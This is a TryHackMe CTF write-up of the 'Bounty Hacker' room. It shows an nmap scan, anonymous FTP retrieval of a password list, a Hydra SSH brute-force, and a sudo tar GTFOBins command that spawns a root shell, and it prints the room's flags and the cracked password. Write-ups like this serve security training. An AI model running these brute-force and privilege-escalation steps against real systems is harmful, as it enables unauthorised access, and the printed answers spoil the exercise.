# [Bounty Hacker CTF] - Writeup

**Platform:** TryHackMe
**Difficulty:** Easy
**Date Completed:** [15.09.2025]  
**Skills Used:** [Password cracking, Privilege escalation]  
**Tools Used:** [Hydra, Nmap]

## Executive Summary

Successfully compromised a Linux system by exploiting anonymous FTP access to obtain credential lists, then performed SSH brute-force attack using Hydra to gain user access as 'lin'. Escalated privileges through misconfigured sudo permissions allowing tar command execution, leveraging GTFOBins techniques to spawn a root shell and achieve full system compromise.

## Initial Reconnaissance

### Port Scanning

We run our first scan using nmap with default options (I also tried to run it with other options but didn't find additional interesting information).

```bash
nmap 10.10.160.235
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-15 15:17 CEST
Nmap scan report for 10.10.160.235
Host is up (0.094s latency).
Not shown: 967 filtered ports, 30 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.07 seconds
```

**Results:**

- Port 21: FTP
- Port 22: SSH
- Port 80: HTTP

## Vulnerability Analysis

As the webpage seems more "decorative", we will start by investigating the ftp port. One little trick I learned in my previous CTFs is to try to login as anonymous user, which gives access to publicly accessible files.

```bash
ftp 10.10.160.235
Connected to 10.10.160.235.
220 (vsFTPd 3.0.5)
Name (10.10.160.235:armould): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get task.txt | cat
usage: get remote-file [local-file]
ftp> get task.txt task.txt
local: task.txt remote: task.txt
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |***********************************|    68       41.06 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.84 KiB/s)
ftp> get locks.txt locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |***********************************|   418        4.10 MiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (4.32 KiB/s)
ftp>
ftp> exit
221 Goodbye.
```

We got 2 different files :

- task.txt :

```bash
cat task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin

```

Which enables us to answer to the CTF's first question :
Who wrote the task list? lin

- locks.txt :

```bash
cat locks.txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e

```

These look like passwords to me, so I am going to try to bruteforce the ssh process by using lin as username and the content of locks.txt as password. I will use Hydra.

```bash
hydra -l lin -P locks.txt ssh://10.10.160.235
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-15 16:10:38
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.160.235:22/
[22][ssh] host: 10.10.160.235   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-15 16:10:44
```

It worked ! So we can answer the next 2 questions :

What service can you bruteforce with the text file found? ssh
What is the users password? RedDr4gonSynd1cat3

We can now connect to the machine as lin :

```bash
ssh lin@10.10.160.235
lin@10.10.160.235's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Mon Aug 11 12:32:35 2025 from 10.23.8.228
```

And the user flag is in /home/lin/user.txt :

User tag : THM{CR1M3_SyNd1C4T3}

## Privilege Escalation

To try to get root access, we run sudo -l in order to see what commands my user could run as root. Luckily enough, there is one : tar. By looking the software up on GTFOBins, I found this command to escalate :

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

The --checkpoint-action=exec=/bin/sh runs a shell without dropping its elevated privileges and bingo : we have root access :) And the flag is in /root/root.txt.

Root tag : THM{80UN7Y_h4cK3r}
